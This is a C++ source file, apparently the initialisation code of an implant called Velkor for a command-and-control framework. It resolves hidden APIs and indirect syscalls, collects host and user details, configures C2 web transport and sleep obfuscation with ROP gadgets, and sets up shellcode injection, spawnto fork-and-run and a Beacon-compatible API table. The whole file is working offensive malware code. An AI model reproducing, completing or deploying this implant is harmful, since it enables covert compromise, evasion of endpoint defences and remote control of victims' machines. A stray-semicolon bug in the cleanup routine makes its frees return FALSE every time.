#include <Velkor.h>

D_SEC( B ) VOID SetNtStatusToSystemError(
    _In_ NTSTATUS NtStatus
) {
    VELKOR_INSTANCE
    
    ULONG WinError =  VkCall<ULONG>( XprNtdll, XPR( "RtlNtStatusToDosError" ), NtStatus );
    Velkor->Teb->LastErrorValue = WinError;
    return;
}

D_SEC( B ) BOOL VelkorInit(
    PVOID Parameter
) {
    VELKOR_INSTANCE

    BOOL    bSuccess    = FALSE;
    ULONG   uSuccess    = 0;
    HANDLE  TokenHandle = NULL;
    HANDLE  KeyHandle   = NULL;
    ULONG   TokenInfLen = 0;
    ULONG   UserTmpLen  = MAX_PATH;
    ULONG   CompTmpLen  = 0;
    ULONG   DomainLen   = 0;
    ULONG   NetBiosLen  = 0;

    CHAR  cProcessorName[MAX_PATH] = { 0 };
    ULONG ProcBufferSize = MAX_PATH;

    PSTR cProcessorNameReg = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";

    SYSTEM_INFO                        SysInfo       = { 0 };
    TOKEN_ELEVATION                    Elevation     = { 0 };
    MEMORYSTATUSEX                     MemInfoEx     = { 0 };
    PROCESS_EXTENDED_BASIC_INFORMATION PsBasicInfoEx = { 0 };

    // Retrieve TEB
    Velkor->Teb = NtCurrentTeb();

    /* ========================[ Load Modules and Functions ]======================== */

    VkCall<VOID>( XprKernel32, XPR( "LoadLibraryA" ), "advapi32.dll" );
    VkCall<VOID>( XprKernel32, XPR( "LoadLibraryA" ), "cryptbase.dll" );
    VkCall<VOID>( XprKernel32, XPR( "LoadLibraryA" ), "wininet.dll" );

    Velkor->VkWin32.Module[eMsvcrt]    = LdrLoadModule( XprMsvcrt );
    Velkor->VkWin32.Module[eKernel32]  = LdrLoadModule( XprKernel32 );
    Velkor->VkWin32.Module[eCryptbase] = LdrLoadModule( XprCryptBase );

    Velkor->VkWin32.FunctionPtr.printf = (decltype(&printf))LdrLoadFunc( Velkor->VkWin32.Module[eMsvcrt], XPR( "printf" ) );

    Velkor->VkWin32.FunctionPtr.NtWaitForSingleObject = LdrLoadFunc( Velkor->VkWin32.Module[eNtdll], XPR( "NtWaitForSingleObject" ) );
    Velkor->VkWin32.FunctionPtr.RtlCaptureContext     = LdrLoadFunc( Velkor->VkWin32.Module[eNtdll], XPR( "RtlCaptureContext" ) );
    Velkor->VkWin32.FunctionPtr.NtGetContextThread    = LdrLoadFunc( Velkor->VkWin32.Module[eNtdll], XPR( "NtGetContextThread" ) );
    Velkor->VkWin32.FunctionPtr.NtSetContextThread    = LdrLoadFunc( Velkor->VkWin32.Module[eNtdll], XPR( "NtSetContextThread" ) );
    Velkor->VkWin32.FunctionPtr.NtTestAlert           = LdrLoadFunc( Velkor->VkWin32.Module[eNtdll], XPR( "NtTestAlert" ) );
    Velkor->VkWin32.FunctionPtr.SetEvent              = LdrLoadFunc( Velkor->VkWin32.Module[eKernel32], XPR( "SetEvent" ) );
    Velkor->VkWin32.FunctionPtr.VirtualProtect        = LdrLoadFunc( Velkor->VkWin32.Module[eKernel32], XPR( "VirtualProtect" ) );
    Velkor->VkWin32.FunctionPtr.WaitForSingleObjectEx = LdrLoadFunc( Velkor->VkWin32.Module[eKernel32], XPR( "WaitForSingleObjectEx" ) );
    Velkor->VkWin32.FunctionPtr.SystemFunction040     = LdrLoadFunc( Velkor->VkWin32.Module[eCryptbase], XPR( "SystemFunction040" ) );
    Velkor->VkWin32.FunctionPtr.SystemFunction041     = LdrLoadFunc( Velkor->VkWin32.Module[eCryptbase], XPR( "SystemFunction041" ) );

    /* ========================[ Initialize Indirect Syscall ]======================== */

    RetrieveSyscall( XPR( "NtAllocateVirtualMemory" ),  &VkSys[eNtAllocateVirtualMemory] );
    RetrieveSyscall( XPR( "NtOpenProcess" ),            &VkSys[eNtOpenProcess] );
    RetrieveSyscall( XPR( "NtOpenThread" ),             &VkSys[eNtOpenThread] );
    RetrieveSyscall( XPR( "NtTerminateProcess" ),       &VkSys[eNtTerminateProcess] );
    RetrieveSyscall( XPR( "NtCreateThreadEx" ),         &VkSys[eNtCreateThreadEx] );
    RetrieveSyscall( XPR( "NtResumeThread" ),           &VkSys[eNtResumeThread] );
    RetrieveSyscall( XPR( "NtOpenProcessToken" ),       &VkSys[eNtOpenProcessToken] );
    RetrieveSyscall( XPR( "NtOpenThreadToken" ),        &VkSys[eNtOpenThreadToken] );
    RetrieveSyscall( XPR( "NtWriteVirtualMemory" ),     &VkSys[eNtWriteVirtualMemory] );
    RetrieveSyscall( XPR( "NtWriteVirtualMemory" ),     &VkSys[eNtWriteVirtualMemory] );
    RetrieveSyscall( XPR( "NtProtectVirtualMemory" ),   &VkSys[eNtProtectVirtualMemory] );
    RetrieveSyscall( XPR( "NtQueryVirtualMemory" ),     &VkSys[eNtQueryVirtualMemory] );
    RetrieveSyscall( XPR( "NtFreeVirtualMemory" ),      &VkSys[eNtFreeVirtualMemory] );

    /* ========================[ Get System Info's ]======================== */

    MemInfoEx.dwLength = sizeof( MEMORYSTATUSEX );

    VkCall<VOID>( XprNtdll, XPR( "NtQueryInformationProcess" ), NtCurrentProcess(), ProcessBasicInformation, &PsBasicInfoEx, sizeof( PsBasicInfoEx ), NULL );
    VkCall<VOID>( XprKernel32, XPR( "GlobalMemoryStatusEx" ), &MemInfoEx );
    VkCall<VOID>( XprKernel32, XPR( "GetNativeSystemInfo" ), &SysInfo );

    bSuccess = VkCall<BOOL>( XprAdvapi32, XPR( "OpenProcessToken" ), NtCurrentProcess(), TOKEN_QUERY, &TokenHandle );
    bSuccess = VkCall<BOOL>( XprAdvapi32, XPR( "GetTokenInformation" ), TokenHandle, TokenElevation, &Elevation, sizeof( Elevation ), &TokenInfLen );

    Velkor->System.TotalRam     = ( MemInfoEx.ullTotalPhys / ( 1024*1024 ) );
    Velkor->System.AvalRam      = ( MemInfoEx.ullAvailPhys / ( 1024*1024 ) );
    Velkor->System.UsedRam      = ( ( MemInfoEx.ullTotalPhys / ( 1024*1024 ) ) - ( MemInfoEx.ullAvailPhys / ( 1024*1024 ) ) );;
    Velkor->System.UsagePercent = MemInfoEx.dwMemoryLoad;

    bSuccess = VkCall<BOOL>( XprKernel32, XPR( "GetComputerNameExA" ), ComputerNameDnsHostname, NULL, &CompTmpLen );
    if ( !bSuccess ) {
        Velkor->System.ComputerName.Start  = VkMem::Heap::Alloc( CompTmpLen );
        Velkor->System.ComputerName.Length = CompTmpLen;
        VkCall<BOOL>( XprKernel32, XPR( "GetComputerNameExA" ), ComputerNameDnsHostname, A_PTR( Velkor->System.ComputerName.Start ), &CompTmpLen );
    }

    bSuccess = VkCall<BOOL>( XprKernel32, XPR( "GetComputerNameExA" ),ComputerNameDnsDomain, NULL, &DomainLen );
    if ( !bSuccess ) {
        Velkor->System.DomainName.Start  = VkMem::Heap::Alloc( DomainLen );
        Velkor->System.DomainName.Length = DomainLen;
        VkCall<BOOL>( XprKernel32, XPR( "GetComputerNameExA" ), ComputerNameDnsDomain, A_PTR( Velkor->System.DomainName.Start ), &DomainLen );
    }

    bSuccess = VkCall<BOOL>( XprKernel32, XPR( "GetComputerNameExA" ), ComputerNameNetBIOS, NULL, &NetBiosLen );
    if ( !bSuccess ) {
        Velkor->System.NetBios.Start  = VkMem::Heap::Alloc( NetBiosLen );
        Velkor->System.NetBios.Length = NetBiosLen;
        VkCall<BOOL>( XprKernel32, XPR( "GetComputerNameExA" ), ComputerNameNetBIOS, A_PTR( Velkor->System.NetBios.Start ), &NetBiosLen );
    }

    Velkor->System.UserName.Start  = VkMem::Heap::Alloc( UserTmpLen );
    Velkor->System.UserName.Length = UserTmpLen;
    VkCall<BOOL>( XprAdvapi32, XPR( "GetUserNameA" ), Velkor->System.UserName.Start, &UserTmpLen );
    
    uSuccess = VkCall<LSTATUS>( 
        XprAdvapi32, XPR( "RegOpenKeyExA" ),
        HKEY_LOCAL_MACHINE, cProcessorNameReg,
        0, KEY_READ, &KeyHandle
    );

    uSuccess = VkCall<LSTATUS>(
        XprAdvapi32, XPR( "RegQueryValueExA" ),
        KeyHandle, "ProcessorNameString", NULL, NULL,
        C_PTR( cProcessorName ), &ProcBufferSize
    );

    VkCall<VOID>( XprAdvapi32, XPR( "RegCloseKey" ), KeyHandle );

    Velkor->System.ProcessorName.Start  = VkMem::Heap::Alloc( ProcBufferSize );
    Velkor->System.ProcessorName.Length = ProcBufferSize;
    VkMem::Copy( Velkor->System.ProcessorName.Start, C_PTR( &cProcessorName ), ProcBufferSize );

    Velkor->System.NumberOfProcessors = SysInfo.dwNumberOfProcessors;

    Velkor->System.OsMajorV         = Velkor->Teb->ProcessEnvironmentBlock->OSMajorVersion;
    Velkor->System.OsMinorV         = Velkor->Teb->ProcessEnvironmentBlock->OSMinorVersion;
    Velkor->System.OsBuildNumber    = Velkor->Teb->ProcessEnvironmentBlock->OSBuildNumber;
    Velkor->System.OsArch           = 9;

    /* ========================[ Web config ]======================== */

    WebConf.Host            = HOST_CONFIG;
    WebConf.Port    	    = PORT_CONFIG;
    WebConf.UserAgent       = USER_AGENT_CONFIG;
    WebConf.AddHeaders      = ADD_HEADERS_CONFIG;
    WebConf.Secure          = TRUE;
    WebConf.ProxyUserName   = NULL;
    WebConf.ProxyServers    = NULL;
    WebConf.ProxyPassword   = NULL;

    /* ========================[ Initialize Session Info's ]======================== */

    Velkor->Session.SyscallMethod   = VkCallIndirect;
    Velkor->Session.AgentId         = ( Random32() % 99999999 );
    Velkor->Session.ProcessName     = Velkor->Teb->ProcessEnvironmentBlock->ProcessParameters->DllPath.Buffer;
    Velkor->Session.ProcessFullPath = Velkor->Teb->ProcessEnvironmentBlock->ProcessParameters->ImagePathName.Buffer;
    Velkor->Session.CommandLine     = Velkor->Teb->ProcessEnvironmentBlock->ProcessParameters->CommandLine.Buffer;
    Velkor->Session.ThreadId        = HandleToUlong( Velkor->Teb->ClientId.UniqueThread );
    Velkor->Session.ProcessId       = HandleToUlong( Velkor->Teb->ClientId.UniqueProcess );
    Velkor->Session.ParentProcessId = PsBasicInfoEx.BasicInfo.InheritedFromUniqueProcessId;
    Velkor->Session.Elevated        = Elevation.TokenIsElevated;
    Velkor->Session.ProcessArch     = PsBasicInfoEx.IsWow64Process;
    Velkor->Session.Protected       = PsBasicInfoEx.IsProtectedProcess;

    /* ========================[ Initialize Sleep Info's ]======================== */

    SleepConf.JmpGadget        = FindJmpGadget( Velkor->VkWin32.Module[eNtdll], 0x23 );
    SleepConf.NtContinueGadget = C_PTR( LdrLoadFunc( Velkor->VkWin32.Module[eNtdll], XPR( "LdrInitializeThunk" ) ) + 19 );
    SleepConf.SleepMask        = VK_SLEEP_MASK;
    SleepConf.SleepTime        = VK_SLEEP_TIME;
    SleepConf.Jitter           = 0;

    /* ========================[ PostEx Info's ]======================== */

    INT16 PipeNameSize = 8;
    ULONG ForkNameSize = 0;

    PSTR  TmpPipeVal   = VkStr::GenerateRndStr( PipeNameSize );
    PSTR  TmpForkVal   = VK_SPAWNTO;

    ForkNameSize = VkStr::LengthA( TmpForkVal ); 
    PipeNameSize = VkStr::LengthA( TmpPipeVal ); 

    InjCtx.Args.Fork.PipeName = A_PTR( VkMem::Heap::Alloc( VkStr::LengthA( TmpPipeVal ) ) );
    PsCtx.Spawn.ProcessName   = A_PTR( VkMem::Heap::Alloc( ForkNameSize ) );
    PsCtx.Type                = VK_PS_TYPE;

    InjCtx.ScRun[ScClassic]  = Injection::Shellcode::Classic;
    // InjCtx.ScRun[ScStomping] = Injection::Shellcode::Stomping;

    VkMem::Zero( PsCtx.Spawn.ProcessName, ForkNameSize );
    VkMem::Copy( PsCtx.Spawn.ProcessName, TmpForkVal, ForkNameSize );
    VkMem::Zero( TmpForkVal, ForkNameSize );

    VkMem::Zero( InjCtx.Args.Fork.PipeName, PipeNameSize );
    VkMem::Copy( InjCtx.Args.Fork.PipeName, TmpPipeVal, PipeNameSize );
    VkMem::Zero( TmpPipeVal, PipeNameSize );

    BEACON_API BeaconApi[] = {
        { XPR( "BeaconDataInt" ),              Beacon::DataInt },
        { XPR( "BeaconDataShort" ),            Beacon::DataShort },
        { XPR( "BeaconDataLength" ),           Beacon::DataLength },
        { XPR( "BeaconDataExtract" ),          Beacon::DataExtract },
        { XPR( "BeaconOutput" ),               Beacon::Output },
        { XPR( "BeaconPrintf" ),               Beacon::Printf },
        { XPR( "BeaconVirtualAlloc" ),         VkMem::Alloc },
        { XPR( "BeaconVirtualProtect" ),       VkMem::Protect },
        { XPR( "BeaconWriteProcessMemory" ),   VkMem::Write },
        { XPR( "BeaconVirtualQuery" ),         VkMem::Query },
        { XPR( "BeaconVirtualFree" ),          VkMem::Free },
        { XPR( "BeaconCreateProcessA" ),       VkProcess::Create },
        { XPR( "BeaconOpenProcess" ),          VkProcess::Open },
        { XPR( "BeaconTerminate" ),            VkProcess::Kill },
        { XPR( "BeaconLoadLibraryA" ),         VkProcess::Create },
        { XPR( "BeaconGetModuleHandleA" ),     LdrLoadModule },
        { XPR( "BeaconGetProcAddress" ),       LdrLoadFunc }
    };

    INT16 BeaconApiLen = ( sizeof( BeaconApi ) / sizeof( BeaconApi[0] ) );

    VkShow( 
    //     "{==================[ Transfer Config ]==================}\n"
         "\t{INIT} Host  => %ws\n"
         "\t{INIT} Port  => %d\n",
         WebConf.Host, WebConf.Port
    );

    VkShow(
        "{================[ Session Config ]======================}\n"
        "\t{INI} Agent ID             => %X\n"
        "\t{INI} Process Name         => %ws\n"
        "\t{INI} Process Arch         => %d\n"
        "\t{INI} Process Full Path    => %ws\n"
        "\t{INI} Command Line         => %ws\n"
        "\t{INI} Process ID           => %d\n"
        "\t{INI} Parent ID            => %d\n"
        "\t{INI} Thread ID            => %d\n"
        "\t{INI} Elevated             => %ws\n"
        "\t{INI} Protected            => %ws\n\n",
        Velkor->Session.AgentId,
        Velkor->Session.ProcessName,
        Velkor->Session.ProcessArch,
        Velkor->Session.ProcessFullPath,
        Velkor->Session.CommandLine,
        Velkor->Session.ProcessId,
        Velkor->Session.ParentProcessId,
        Velkor->Session.ThreadId,
        Velkor->Session.Elevated ?  L"TRUE" : L"FALSE",
        Velkor->Session.Protected ? L"TRUE" : L"FALSE"
    );

    VkShow(
        "{================[ System Config ]======================}\n"
        "\t{INI} Processor Name       => %s\n"
        "\t{INI} Total RAM Memory     => %d\n"
        "\t{INI} Available RAM Memory => %d\n"
        "\t{INI} Usage RAM Memory     => %d (%d%%)\n"
        "\t{INI} User Name            => %s\n"
        "\t{INI} Computer Name        => %s\n"
        "\t{INI} Domain Name          => %s\n"
        "\t{INI} Net BIos             => %s\n\n",
        Velkor->System.ProcessorName.Start,
        Velkor->System.TotalRam,
        Velkor->System.AvalRam,
        Velkor->System.UsedRam,
        Velkor->System.UsagePercent,
        Velkor->System.UserName.Start,
        Velkor->System.ComputerName.Start,
        Velkor->System.DomainName.Start,
        Velkor->System.NetBios.Start
    );

    VkShow(
        "{================[ Sleep Config ]======================}\n"
        "\t{INI} Sleep Time  => %d\n"
        "\t{INI} Jitter      => %d\n",
        SleepConf.SleepTime,
        SleepConf.Jitter
    );

    return ( bSuccess && uSuccess );
}

D_SEC( B ) BOOL VelkorCleanup(
    VOID
) {
    VELKOR_INSTANCE

    if ( !VkMem::Heap::Free( Velkor->System.ComputerName.Start,  Velkor->System.ComputerName.Length   ) ); return FALSE;
    if ( !VkMem::Heap::Free( Velkor->System.NetBios.Start,       Velkor->System.NetBios.Length        ) ); return FALSE;
    if ( !VkMem::Heap::Free( Velkor->System.ProcessorName.Start, Velkor->System.ProcessorName.Length  ) ); return FALSE;
    if ( !VkMem::Heap::Free( Velkor->System.DomainName.Start,    Velkor->System.DomainName.Length     ) ); return FALSE;
    if ( !VkMem::Heap::Free( Velkor->System.UserName.Start,      Velkor->System.UserName.Length       ) ); return FALSE;

    return TRUE;    
}
